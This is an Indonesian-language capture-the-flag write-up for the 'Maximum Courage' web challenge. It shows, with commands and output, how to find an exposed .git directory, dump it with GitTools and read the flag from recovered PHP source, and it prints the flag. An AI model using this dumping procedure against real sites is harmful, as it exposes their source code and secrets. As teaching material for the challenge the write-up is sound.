## [Writeup] Cyber Talents: Maximum Courage


Tutorial ini akan membahas solusi untuk soal CTF [Cyber Talents: Maximum Courage](https://cybertalents.com/challenges/web/maximum-courage) yang termasuk ke dalam kategori web security. Berikut ini adalah petunjuk untuk soal tersebut:

```
Max prefers to learn by practicing and not just reading all day, so he set up
a webserver and hopes it stays secret, can you prove it has a weakness?
```

Untuk soal kali ini, dapat diakses pada [tautan ini](http://35.197.204.100/maximum/). Gunakan browser untuk mengakses halaman soal tersebut, atau bisa juga menggunakan [HTTPie](https://httpie.org) seperti ini:

```bash
% http "http://35.197.204.100/maximum/"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 03 Aug 2020 05:39:48 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<title>MAX</title>
<body style="margin:0px;padding:0px;background-color:#000;color:#01ba17">
<div style="padding:100px;width:70%;margin: 0px auto;font-size:26px;">
Welcome to max's hideway.<br /><br />
I learn security by watching hackers break my website, so to my understanding the PHP source code is never served to the user so you can't see the content of my <a style="color:#01ba17" href="flag.php" target="_BLANK" />flag.php</a>
</div>
</body>
```

Bisa terlihat bahwa pada halaman tersebut terdapat tautan ke file **flag.php**. Coba kita periksa tautan tersebut:

```bash
% http "http://35.197.204.100/maximum/flag.php"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Mon, 03 Aug 2020 05:40:40 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

You can't view this flag directly.
<!-- PHP source doesn't appear on HTML comments -->
```

Kita tidak dapat mengakses file **flag.php** secara langsung. Coba kita ganti ekstensinya menjadi **.phps** yang merupakan ekstensi untuk file source PHP:

```bash
% http "http://35.197.204.100/maximum/flag.phps"
HTTP/1.1 404 Not Found
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Tue, 04 Aug 2020 00:23:57 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.10.3 (Ubuntu)</center>
</body>
</html>
```

Hasilnya nihil. Demikian pula jika kita mencoba beberapa kemungkinan lainnya misalnya **flag.php~** atau **flag.html**, bahkan file **robots.txt** juga tidak ada. Karena petunjuk yang terdapat pada file **flag.php** adalah _source_, kita akan mencoba mencari direktori tersembunyi yang sering digunakan oleh version control system misalnya [git](https://git-scm.com/).

```bash
% http "http://35.197.204.100/maximum/.git/"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Mon, 03 Aug 2020 05:41:21 GMT
Server: nginx/1.10.3 (Ubuntu)
Transfer-Encoding: chunked

<html>
<head><title>Index of /maximum/.git/</title></head>
<body bgcolor="white">
<h1>Index of /maximum/.git/</h1><hr><pre><a href="../">../</a>
<a href="hooks/">hooks/</a>                      23-Feb-2019 13:28                   -
<a href="info/">info/</a>                       23-Feb-2019 13:28                   -
<a href="logs/">logs/</a>                       23-Feb-2019 13:30                   -
<a href="objects/">objects/</a>                    23-Feb-2019 13:30                   -
<a href="refs/">refs/</a>                       23-Feb-2019 13:28                   -
<a href="COMMIT_EDITMSG">COMMIT_EDITMSG</a>              23-Feb-2019 13:30                 266
<a href="HEAD">HEAD</a>                        23-Feb-2019 13:28                  23
<a href="config">config</a>                      23-Feb-2019 13:30                 196
<a href="description">description</a>                 23-Feb-2019 13:28                  73
<a href="index">index</a>                       23-Feb-2019 13:30                 209
</pre><hr></body>
</html>
```

Ternyata benar, pada tautan tersebut terdapat sub direktori tersembunyi. Namun, kita tidak dapat melakukan kloning terhadap sub direktori tersebut secara langsung. Untuk itu, kita akan menggunakan beberapa script yang terdapat pada [GitTools](https://github.com/internetwache/GitTools). Lakukan kloning terhadap repositori GitTools:

```bash
% git clone "https://github.com/internetwache/GitTools"
```

Selanjutnya, kita akan menggunakan script **gitdumper.sh** untuk menyalin semua isi dari direktori pada server dengan perintah seperti ini:

```bash
% ./GitTools/Dumper/gitdumper.sh "http://35.197.204.100/maximum/.git/" ctf
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ctf/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/ca/432659ef19b8e1cfd6607878c4eb5a778dc37d
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/08/48654ac283468f006838972da074064826f6e9
[+] Downloaded: objects/f3/df28f6e6614d7753ba2e5c45447fde1a99671a
[+] Downloaded: objects/c2/72c09bb7c1a565df8230f07f0e29db84fd676e
```

Hasil dari perintah di atas akan disimpan pada sub direktori **ctf**. Selanjutnya, kita akan mengekstrak file object yang terdapat pada sub direktori **ctf** menggunakan script **extractor.sh** seperti ini:

```bash
% ./GitTools/Extractor/extractor.sh ctf dst
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: ca432659ef19b8e1cfd6607878c4eb5a778dc37d
[+] Found file: /tmp/dst/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d/flag.php
[+] Found file: /tmp/dst/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d/index.php
```

Hasil ekstrak akan disimpan pada sub direktori **dst**, dan dapat kita lihat seperti ini:

```bash
% cat dst/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d/flag.php
You can't view this flag directly.
<!-- PHP source doesn't appear on HTML comments -->
<?php
exit();
die();
$secret_key = 'be607453caada6a05d00c0ea0057f733';
?>
```

Seperti yang terlihat di atas, kita dapat melihat kode sumber file **flag.php**, dan terdapat variabel **$secret_key** yang merupakan flagnya, yaitu `be607453caada6a05d00c0ea0057f733`. Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
